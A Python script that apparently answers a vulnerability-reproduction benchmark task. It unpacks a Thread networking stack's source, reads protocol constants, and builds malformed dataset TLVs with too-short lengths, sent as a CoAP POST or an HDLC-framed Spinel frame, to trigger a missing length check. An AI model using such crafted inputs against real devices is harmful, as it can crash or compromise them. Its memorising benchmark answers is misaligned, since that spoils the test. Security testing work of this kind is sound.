import os
import re
import tarfile
import tempfile
from pathlib import Path
from typing import Dict, Optional, Tuple, List


def _is_within_directory(directory: str, target: str) -> bool:
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            continue
        try:
            tar.extract(member, path=path)
        except Exception:
            pass


_INT_TOKEN_RE = re.compile(r"\b([A-Za-z_][A-Za-z0-9_]*)\b")


def _parse_int_expr(expr: str, macros: Dict[str, int]) -> Optional[int]:
    if expr is None:
        return None
    s = expr.strip()
    if not s:
        return None
    s = re.sub(r"/\*.*?\*/", " ", s, flags=re.S)
    s = re.sub(r"//.*", " ", s)
    s = s.strip().rstrip(",")
    if not s:
        return None

    if re.fullmatch(r"0x[0-9A-Fa-f]+", s):
        try:
            return int(s, 16)
        except Exception:
            return None
    if re.fullmatch(r"\d+", s):
        try:
            return int(s, 10)
        except Exception:
            return None
    if s in macros:
        return macros[s]

    def repl(m):
        name = m.group(1)
        if name in macros:
            return str(macros[name])
        return name

    s2 = _INT_TOKEN_RE.sub(repl, s)
    if re.search(r"[A-Za-z_]", s2):
        return None

    if not re.fullmatch(r"[0-9xXa-fA-F\s\(\)\|\&\^\~\<\>\+\-\*\/%]+", s2):
        return None

    try:
        val = eval(s2, {"__builtins__": {}}, {})
    except Exception:
        return None
    if not isinstance(val, int):
        return None
    return val


def _read_text_file(path: str, max_bytes: int = 2_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            data = data[:max_bytes]
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _collect_macros(root: str) -> Dict[str, int]:
    macros: Dict[str, int] = {}
    define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+?)\s*$", re.M)
    for dirpath, dirnames, filenames in os.walk(root):
        dn = os.path.basename(dirpath)
        if dn in (".git", ".svn", ".hg"):
            dirnames[:] = []
            continue
        for fn in filenames:
            if not fn.endswith((".h", ".hpp", ".hh", ".hxx", ".c", ".cc", ".cpp", ".cxx")):
                continue
            p = os.path.join(dirpath, fn)
            txt = _read_text_file(p)
            if not txt:
                continue
            for m in define_re.finditer(txt):
                name = m.group(1)
                expr = m.group(2).strip()
                if name in macros:
                    continue
                val = _parse_int_expr(expr, macros)
                if val is not None:
                    macros[name] = val
    return macros


def _find_const_assignments(root: str, names: List[str], macros: Dict[str, int]) -> Dict[str, int]:
    found: Dict[str, int] = {}
    patterns = []
    for nm in names:
        patterns.append((nm, re.compile(rf"\b{re.escape(nm)}\b\s*=\s*([^,\n\}}]+)")))
    for dirpath, dirnames, filenames in os.walk(root):
        dn = os.path.basename(dirpath)
        if dn in (".git", ".svn", ".hg"):
            dirnames[:] = []
            continue
        for fn in filenames:
            if not fn.endswith((".h", ".hpp", ".hh", ".hxx", ".c", ".cc", ".cpp", ".cxx")):
                continue
            p = os.path.join(dirpath, fn)
            txt = _read_text_file(p)
            if not txt:
                continue
            for nm, pat in patterns:
                if nm in found:
                    continue
                m = pat.search(txt)
                if not m:
                    continue
                expr = m.group(1)
                val = _parse_int_expr(expr, macros)
                if val is not None and 0 <= val <= 0xFF:
                    found[nm] = val
    return found


def _find_uri_string(root: str, uri_name_candidates: List[str]) -> Optional[str]:
    for dirpath, dirnames, filenames in os.walk(root):
        dn = os.path.basename(dirpath)
        if dn in (".git", ".svn", ".hg"):
            dirnames[:] = []
            continue
        for fn in filenames:
            if not fn.endswith((".h", ".hpp", ".cc", ".cpp", ".cxx")):
                continue
            p = os.path.join(dirpath, fn)
            txt = _read_text_file(p)
            if not txt:
                continue
            for nm in uri_name_candidates:
                if nm not in txt:
                    continue
                m = re.search(rf'\b{re.escape(nm)}\b[^=]*=\s*"([^"]+)"', txt)
                if m:
                    s = m.group(1)
                    if s and all(32 <= ord(c) < 127 for c in s):
                        return s
    return None


def _encode_coap_option(delta: int, value: bytes) -> bytes:
    length = len(value)

    def enc_nibble(x: int) -> Tuple[int, bytes]:
        if x <= 12:
            return x, b""
        if x <= 268:
            return 13, bytes([x - 13])
        if x <= 65804:
            y = x - 269
            return 14, bytes([(y >> 8) & 0xFF, y & 0xFF])
        return 15, b""

    d_n, d_ext = enc_nibble(delta)
    l_n, l_ext = enc_nibble(length)
    first = ((d_n & 0x0F) << 4) | (l_n & 0x0F)
    return bytes([first]) + d_ext + l_ext + value


def _build_coap_post(uri_path: str, payload: bytes) -> bytes:
    # CoAP header: Ver=1, Type=CON(0), TKL=0 => 0x40
    # Code: POST => 0x02
    # Message ID: 0x0001
    hdr = bytes([0x40, 0x02, 0x00, 0x01])
    opts = b""
    last_opt = 0
    uri_opt_num = 11  # Uri-Path
    segments = [seg for seg in uri_path.split("/") if seg]
    for seg in segments:
        delta = uri_opt_num - last_opt
        last_opt = uri_opt_num
        opts += _encode_coap_option(delta, seg.encode("ascii", errors="ignore"))
    if payload:
        return hdr + opts + b"\xFF" + payload
    return hdr + opts


def _spinel_pack_uint(x: int) -> bytes:
    if x < 0:
        x = 0
    out = bytearray()
    while True:
        b = x & 0x7F
        x >>= 7
        if x:
            out.append(0x80 | b)
        else:
            out.append(b)
            break
    return bytes(out)


def _crc16_x25(data: bytes) -> int:
    # CRC-16/X-25 (HDLC FCS): init=0xFFFF, poly=0x8408 (reflected), xorout=0xFFFF
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0x8408
            else:
                crc >>= 1
    crc ^= 0xFFFF
    return crc & 0xFFFF


def _hdlc_escape(data: bytes) -> bytes:
    out = bytearray()
    for b in data:
        if b in (0x7E, 0x7D):
            out.append(0x7D)
            out.append(b ^ 0x20)
        else:
            out.append(b)
    return bytes(out)


def _build_spinel_prop_set(prop_id: int, tlvs: bytes, use_hdlc: bool) -> bytes:
    # Minimal Spinel frame: HEADER + CMD(PROP_VALUE_SET=3) + PROP_ID + DATA (uint16 len + bytes)
    header = 0x81  # Common host->NCP header used in many implementations
    cmd = 3
    frame = bytes([header]) + _spinel_pack_uint(cmd) + _spinel_pack_uint(prop_id) + (len(tlvs) & 0xFFFF).to_bytes(2, "little") + tlvs
    if not use_hdlc:
        return frame
    fcs = _crc16_x25(frame).to_bytes(2, "little")
    inner = frame + fcs
    return b"\x7E" + _hdlc_escape(inner) + b"\x7E"


def _select_fuzzer_mode(root: str) -> Tuple[str, bool]:
    # Returns (mode, use_hdlc). mode in {"raw","coap","spinel"}
    best_score = -1
    best_txt = ""
    for dirpath, dirnames, filenames in os.walk(root):
        dn = os.path.basename(dirpath)
        if dn in (".git", ".svn", ".hg"):
            dirnames[:] = []
            continue
        for fn in filenames:
            if not fn.endswith((".c", ".cc", ".cpp", ".cxx")):
                continue
            p = os.path.join(dirpath, fn)
            txt = _read_text_file(p)
            if "LLVMFuzzerTestOneInput" not in txt:
                continue
            low = txt.lower()
            score = 0
            if "dataset" in low:
                score += 10
            score += low.count("otdataset") * 6
            score += low.count("meshcop") * 5
            score += low.count("pending") * 2
            score += low.count("active") * 2
            score += low.count("spinel") * 5
            score += low.count("ncp") * 5
            score += low.count("coap") * 3
            if score > best_score:
                best_score = score
                best_txt = txt

    if best_score < 0:
        return "raw", False

    low = best_txt.lower()
    use_hdlc = ("hdlc" in low) or ("ncp_hdlc" in low)

    if ("spinel" in low) or ("ncp" in low):
        return "spinel", use_hdlc
    if ("coap" in low) and ("meshcop" in low or "dataset" in low):
        return "coap", False
    return "raw", False


def _build_malformed_dataset_tlvs(active_type: int, pending_type: int, delay_type: int) -> bytes:
    # Intentionally too-short lengths to trigger missing minimum-length validation.
    # Use length=1 to ensure TLV exists and is "present", but too small for fixed-size reads.
    return bytes([
        active_type & 0xFF, 1, 0x00,
        pending_type & 0xFF, 1, 0x00,
        delay_type & 0xFF, 1, 0x00,
    ])


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    _safe_extract_tar(tar, td)
            except Exception:
                # If extraction fails, return a reasonable default TLV stream.
                return _build_malformed_dataset_tlvs(0x0E, 0x0F, 0x34)

            root = td
            macros = _collect_macros(root)

            consts = _find_const_assignments(
                root,
                ["kActiveTimestamp", "kPendingTimestamp", "kDelayTimer",
                 "SPINEL_PROP_THREAD_ACTIVE_DATASET_TLVS", "SPINEL_PROP_THREAD_PENDING_DATASET_TLVS",
                 "SPINEL_PROP_THREAD_ACTIVE_DATASET", "SPINEL_PROP_THREAD_PENDING_DATASET"],
                macros
            )

            active_type = consts.get("kActiveTimestamp", 0x0E)
            pending_type = consts.get("kPendingTimestamp", 0x0F)
            delay_type = consts.get("kDelayTimer", 0x34)

            tlvs = _build_malformed_dataset_tlvs(active_type, pending_type, delay_type)

            mode, use_hdlc = _select_fuzzer_mode(root)
            if mode == "coap":
                uri = _find_uri_string(root, ["kUriPendingSet", "kUriActiveSet", "kUriPendingSetPath", "kUriActiveSetPath"])
                if not uri:
                    uri = "c/ps"
                return _build_coap_post(uri, tlvs)

            if mode == "spinel":
                prop = consts.get("SPINEL_PROP_THREAD_PENDING_DATASET_TLVS")
                if prop is None:
                    prop = consts.get("SPINEL_PROP_THREAD_ACTIVE_DATASET_TLVS")
                if prop is None:
                    prop = consts.get("SPINEL_PROP_THREAD_PENDING_DATASET")
                if prop is None:
                    prop = consts.get("SPINEL_PROP_THREAD_ACTIVE_DATASET")
                if prop is None:
                    # Commonly, PENDING_DATASET_TLVS is used, but fallback to a small plausible value.
                    prop = 0x003E
                return _build_spinel_prop_set(int(prop), tlvs, use_hdlc)

            return tlvs